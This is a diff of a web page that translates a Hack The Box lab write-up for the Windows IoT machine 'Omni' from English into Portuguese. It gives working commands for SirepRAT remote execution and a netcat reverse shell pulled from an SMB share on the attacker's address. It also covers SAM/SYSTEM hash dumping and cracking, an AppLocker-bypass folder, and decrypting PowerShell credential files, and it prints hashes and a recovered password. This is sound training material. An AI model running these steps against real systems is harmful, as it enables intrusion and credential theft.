@@ -134,50 +134,54 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p><img src="Assets/HTB-Windows-Easy-omni/547286d87bae2e17e0694432b7e4b920.webp" alt="" /></p>
-<h1 id="writeup-of-omni"><a class="header" href="#writeup-of-omni">Writeup of <em>OMNI</em></a></h1>
-<h4 id="easy-machine-hacktheboxcom"><a class="header" href="#easy-machine-hacktheboxcom">Easy machine (hackthebox.com)</a></h4>
-<h4 id="sylvain-javali-júlio---08092021"><a class="header" href="#sylvain-javali-júlio---08092021">Sylvain (Javali) Júlio - 08/09/2021</a></h4>
+                        <p><img src="Assets/HTB-Windows-Easy-omni/icon.webp" alt="" /></p>
+<h1 id="resolução-da-máquina-omni"><a class="header" href="#resolução-da-máquina-omni">Resolução da máquina <em>OMNI</em></a></h1>
+<h4 id="máquina-fácil-hacktheboxcom"><a class="header" href="#máquina-fácil-hacktheboxcom">Máquina Fácil (hackthebox.com)</a></h4>
+<h4 id="by-javalimz---08092021"><a class="header" href="#by-javalimz---08092021">by <strong><em>JavaliMZ</em></strong> - 08/09/2021</a></h4>
 <hr />
 <hr />
-<h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
+<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
-<p>For enumeration, after verifying the connection, I always do a nmap scan like this:</p>
+<p>A primeira ferramenta que sempre uso para enumerar qualquer máquina é o nmap. Essa ferramenta permite-nos enumerar as portas abertas de um dado IP, e versões e potenciais vulnerabilidades de softwares que estão correndo em cada porta.</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/allPorts.png" alt="allPorts Scan" /> <img src="Assets/HTB-Windows-Easy-omni/nmap-A.png" alt="nmap-A" /></p>
-<p>At this point, we know:</p>
+<p>Neste momento, sabemos que:</p>
 <ul>
-<li>Port 135 Open: MSRPC is an interprocess communication (IPC) mechanism that allows client/server software communcation</li>
-<li>Port 8080 open: Basic realm=Windows Device Portal - The Windows Device Portal (WDP) is a web server included with Windows devices that lets you configure and manage the settings for the device over a network or USB connection.  Access to port 8080 from the web browser is restricted by basic authentication</li>
+<li>
+<p>Porta 135 aberta: MSRPC é um mecanismo de comunicação entre processos &quot;interprocess communication (IPC)&quot; que permite comunicações entre clientes e servidores</p>
+</li>
+<li>
+<p>Porta 8080 aberta: O nmap identificou quer o programar que está a rodar nele é o <em>Basic realm=Windows Device Portal</em> - Windows Device Portal (WDP) - é um web server incluido com o Windows devices que permite configurar e gerir um windows e seus serviços através da internet ou por USB. O acesso pela porta 8080 está restringida, necessitando de uma autenticação válida.</p>
+</li>
 </ul>
 <p><img src="Assets/HTB-Windows-Easy-omni/login_8080.png" alt="Login 8080" /></p>
-<p>After some researches, if we google for <em>&quot;Windows Device Portal exploit github&quot;</em>, we can find this tool:</p>
+<p>Depois de alguma pesquisa, se pesquisar-mos por <em>&quot;Windows Device Portal exploit github&quot;</em>, podemos encontrar esta ferramenta:</p>
 <blockquote>
 <p>SirepRAT - RCE as SYSTEM on Windows IoT Core - GitHub (https://github.com/SafeBreach-Labs/SirepRAT)</p>
 </blockquote>
 <p><img src="Assets/HTB-Windows-Easy-omni/win_IoT_Core.jpg" alt="Windows IoT Core" /></p>
-<h1 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h1>
+<h1 id="exploração"><a class="header" href="#exploração">Exploração</a></h1>
 <pre><code class="language-bash">git clone https://github.com/SafeBreach-Labs/SirepRAT.git
 cd SirepRAT
 
 sudo python3 setup.py install
 
-# The syntaxt is a bit hard... but the github page as a lot of examples...
+# A sintax é um pouco estranha... mas a sua página de GitHub contém bastantes exemplos...
 python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c echo {{userprofile}}&quot;
 </code></pre>
 <p>The command give us an output that looks good. But we can confirm if we have RCE with a better combo!</p>
-<pre><code class="language-bash"># Listening for pings
+<p>O comando retorna um output que parece convincente. Mas é preciso confirmar se temos realmente <strong>Remote Code Execution (RCE)</strong>. Para isso, podemos enviar uma traça ICMP para a nossa própria máquina Kali, ficando a escuta do lado do kali.</p>
+<pre><code class="language-bash"># Capturando todas as comunicações ICMP (Pings) entrando e saindo pelo tun0 (VPN do HackTheBox)
 sudo tcpdump -i tun0 icmp
 
-# Run RCE on the target machine to ping my kali machine
+# Execução remota na máquina alvo, para que nos &quot;pingue&quot; a nossa máquina Kali
 python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c ping 10.10.14.16&quot;
 </code></pre>
 <p><img src="Assets/HTB-Windows-Easy-omni/ping_RCE.png" alt="RCE Ping" /> <img src="Assets/HTB-Windows-Easy-omni/tcpdump_ping_RCE.png" alt="RCE Ping - TCPDump listener" /></p>
-<p>At this point, we know we have effectively RCE. So, the next step is to get a reverse shell</p>
+<p>Agora que temos a certeza de executar comandos remotamente, podemos tratar de estabelecer um reverse shell. Tentei de várias formas:</p>
 <ul>
-<li>I tryied Certutil but don't work (don't existe)</li>
-<li>I tryied with IEX but don't work too (don't exist')</li>
-<li>I create a smbserver, wget a netcat (nc64.exe) on my kali</li>
-<li>Prepare the listener to receive the reverse shell <em>(sudo rlwrap nc -lvnp 443)</em></li>
+<li>Tentei fazer o donwload de um nc64.exe através da ferramenta certutil.exe normalmente presente em Windows, mas sem sucesso (certutil.exe não existe)</li>
+<li>Tentei com IEX e com IWR do Powershell, mas também sem sucesso (também não existem)</li>
+<li>Criei um servidor samba no meu Kali, com smbserver, onde disponibilizava um nc64.exe.</li>
 </ul>
 <pre><code class="language-bash"># SMB Server
 sudo smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support
@@ -190,36 +194,39 @@ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &
 
 python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args ' /c \\10.10.14.16\smbFolder\nc64.exe -e cmd 10.10.14.16 443'
 </code></pre>
-<p>We are in the target machine! </p>
+<p><strong><em>Estamos na máquina!</em></strong></p>
 <p><img src="Assets/HTB-Windows-Easy-omni/ipconfig.png" alt="ipconfig" /></p>
-<h1 id="privesc"><a class="header" href="#privesc">Privesc</a></h1>
-<h2 id="enumeration-of-the-system"><a class="header" href="#enumeration-of-the-system">Enumeration of the System.</a></h2>
-<p>On all CTF, the objective is to get flag (close to always user.txt and root.txt)</p>
-<p>If we have permitions, we can find this with a simple command:</p>
+<h1 id="escalada-de-privilégios"><a class="header" href="#escalada-de-privilégios">Escalada de privilégios</a></h1>
+<h2 id="enumeração-do-sistema"><a class="header" href="#enumeração-do-sistema">Enumeração do sistema</a></h2>
+<p>Para todos os CaptureTheFlag, o objectivo é conseguir ler a <em>flag</em> (user.txt e root.txt)</p>
+<p>Se tivermos privilégios suficientes, podemos encontrá-los através de um simples comando:</p>
 <pre><code class="language-bash">cd C:\
+# Procura recursiva da referida string, a partir da pasta onde nos encontramos:
 dir /r /s user.txt  # user.txt : C:\Data\Users\app
 dir /r /s root.txt  # root.txt : C:\Data\Users\administrator
 
+# Ver quem tem que privilégios nesses ficheiros
 icacls C:\Data\Users\app\user.txt  # NT AUTHORITY\SYSTEM:(I)(F)
 								   # BUILTIN\Administrators:(I)(F)
-                                   # OMNI\app:(I)(F)
+								   # OMNI\app:(I)(F)
 
 icacls C:\Data\Users\administrator\root.txt  # NT AUTHORITY\SYSTEM:(I)(F)
-                                             # BUILTIN\Administrators:(I)(F)
-                                             # OMNI\Administrator:(I)(F)
+											 # BUILTIN\Administrators:(I)(F)
+											 # OMNI\Administrator:(I)(F)
 </code></pre>
 <p>At this point, we suppose we have to migrate at the user app, or directly at administrator... We don't know what privilege we have, but we know with SAM and SYSTEM files, we can extract all NT hash from all LOCAL users of the target machine. We give a try...</p>
+<p>O proximo passo é migrar de usuários. Nest momento nos estamos com um usuário do Windows Device Portal, e não como usuário da máquina alvo. Esse tipo de usuário pode executar alguns comando no sistema mas tem um poder muito maior. Tem privilégios para verificar a memória RAM do sistema. Isso significa que podemos extrair o HKLM\System e o HKLM\Sam para recuperar informações dos usuários locais (uid:rid:lmhash:nthash)</p>
 <pre><code class="language-bash">reg save HKLM\SYSTEM SYSTEM.bak  # The operation completed successfully.
 reg save HKLM\SAM SAM.bak        # The operation completed successfully.
 
-# Download that files with smbserver
+# Copiar os dois novos ficheiros para o nosso Kali
 copy .\SAM.bak \\10.10.14.16\smbFolder\SAM.bak
 copy .\SYSTEM.bak \\10.10.14.16\smbFolder\SYSTEM.bak
 
-# On kali machine, extract data
+# No kali, extrair os dados
 secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL
 #&gt;  Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
-#&gt;  
+#&gt;
 #&gt;  [*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
 #&gt;  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 #&gt;  Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
@@ -231,7 +238,7 @@ secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL
 #&gt;  app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
 #&gt;  [*] Cleaning up...
 </code></pre>
-<p>Now, with all that hashes, we can try to crack them with john the ripper, and rockyou.txt</p>
+<p>Com esses hashes, podemos tentar crackear as passwords com a ferramenta &quot;john the ripper&quot;, e a tão famosa wordlist &quot;rockyou.txt&quot;.</p>
 <pre><code class="language-bash">echo &quot;Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -243,42 +250,40 @@ app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::&qu
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes
 john --format=NT --show hashes  # app:mesh5143
 </code></pre>
-<p>I tryied to Invoke_Command with the credentials we get but dont worked... So i tried to login into the website at port 8080</p>
+<p>Neste momento tentei usar o Invoke_Command com as novas credentiais mas sem sucesso (também não existe...). Então tentei fazer login na página web que estava na porta 8080</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/http_logged.png" alt="http logged" /></p>
 <p><img src="Assets/HTB-Windows-Easy-omni/RCE_website.png" alt="RCE website" /></p>
-<p>We can execute commands directely with Windows Device Portal. But it's always better get a real reverse shell...
-We can't do the same with smbserver, but we can transfere nc64.exe to the target. I always choose C:\Windows\System32\spool\drivers\color\ path because is nearly never blocked (applocker bypass)...</p>
-<pre><code class="language-bash"># On reverse shell with user omni
+<p>Podemos executar commandos diretamente do Windows Device Portal, Mas é sempre melhor ter uma verdadeira reverse shell... Não sei porquê, mas não consegui executar o reverse shell diretamente do samba server, mas, ainda com a shell já aberta, podemos copiar o nc64.exe para uma pasta local. Eu escolho sempre o C:\Windows\System32\spool\drivers\color\ porque praticamente nunca está bloqueado (ver applocker bypass)</p>
+<pre><code class="language-bash"># Ainda com o usuário omni
 copy \\10.10.14.16\smbFolder\nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe
 
-# On website with user app
+# Com o usuário app, a partir do website
 C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 </code></pre>
 <h2 id="user-app"><a class="header" href="#user-app">User &quot;app&quot;</a></h2>
-<p>In the home directory of &quot;app&quot;, we can see the user.txt, but we can see another strange file: iot-admin.xml.
-The file looks like this:</p>
+<p>In the home directory of &quot;app&quot;, we can see the user.txt, but we can see another strange file: iot-admin.xml. The file looks like this:</p>
+<p>Na pasta raiz do usuário &quot;app&quot;, podemos ver a flag user.txt, mas também vemos um outro ficheiro estranho: iot-admin.xml. O ficheiro contém o seguinte:</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/SS-file.png" alt="ss-files" /></p>
-<p>This file is a Powershell Credential. to extract the &quot;Password&quot; field, we can do that:</p>
+<p>Este tipo de ficheiro é uma Credencial de Powershell. Para extrair o campo Password, podemos fazer o seguinte:</p>
 <pre><code class="language-bash">(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
 #&gt; _1nt3rn37ofTh1nGz
-# This maybe is the password of administrator.
+# Isto poderá ser a palavra chave do administrator.
 # administrator:_1nt3rn37ofTh1nGz
 
-# with the same process (because root.txt, user.txt and iot-admin.xml are all Powershell Credentials), we can extract the user.txt flag:
+# Como todos os ficheiros (iot-admin.xml, user.txt, root.txt) estão em formato Powershell Credential, vamos extraí-los todos da mesma maneira...
 (Import-CliXml -Path user.txt).GetNetworkCredential().password
-# 7cfd50f6bc34db3204.............. 
+# 7cfd50f6bc34db3204..............   (Esta é a flag parcial)
 </code></pre>
-<p>With new credential, we can login on website as user administrator</p>
+<p>Com a nova credencial, podemos efectuar o login no website enquanto administrador do sistema</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/web-administrator.png" alt="web administrator logged" /></p>
-<p>Now we can get reverse shell with the same nc64.exe we download before</p>
+<p>Agora podemos estabelecer um reverse shell com o mesmo binário do nc64.exe já transferido</p>
 <pre><code class="language-bash">C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 </code></pre>
 <p><img src="Assets/HTB-Windows-Easy-omni/administrator-reverse-shell.png" alt="administrator reverse shell" /></p>
-<p>For the flag, we use the same tecnic to extract the password of the Powershell Credential:</p>
-<pre><code class="language-bash">type root.txt  # Props are the same 'UserName' and 'Password'
+<p>E para a flag root.txt, vamos usar outra vez a mesma técnica para extrair o campo Password do ficheiro de Credencial do Powershell.</p>
+<pre><code class="language-bash">type root.txt  # As propriedades são ainda as mesmas: 'UserName' e 'Password'
 (Import-CliXml -Path root.txt).GetNetworkCredential().Password
-#&gt; 5dbdce5569e2c47.................
-
+#&gt; 5dbdce5569e2c47.................    (Esta é a flag parcial de root.txt)
 </code></pre>
 
                     </main>
